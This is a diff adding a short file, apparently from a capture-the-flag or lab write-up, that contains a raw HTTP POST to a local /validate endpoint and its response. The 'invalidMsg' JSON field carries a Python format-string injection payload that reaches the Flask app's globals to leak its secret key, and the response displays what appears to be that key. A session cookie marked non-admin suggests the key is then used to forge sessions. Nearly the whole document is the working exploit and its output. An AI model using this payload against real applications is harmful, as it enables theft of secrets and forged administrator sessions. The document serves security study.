@@ -1,0 +1,35 @@
+```HTTP
+POST /validate HTTP/1.1
+Host: localhost:8080
+Content-Length: 141
+sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Content-Type: application/json
+Accept: */*
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=eyJpc0FkbWluIjpmYWxzZX0.Y0C_aQ.u7XE04JffCqrpKfQTyUCQIxE0N8
+Connection: close
+
+{"schema":{"name":"str",
+"foo":"str"},"validMsg":"","invalidMsg":"{.__setattr__.__globals__[app].secret_key}","data":"{\"name\":\"dimas\"}"}
+
+```
+
+```HTTP
+HTTP/1.1 200 OK
+server: nginx/1.18.0
+date: Sat, 08 Oct 2022 01:28:37 GMT
+content-type: application/json
+content-length: 85
+connection: close
+
+{"isError":true,"message":"SchemaMissingKeyError: 3PmqjTIyNHJe3i5psDJNFAkwoJyUZTwy"}
+```
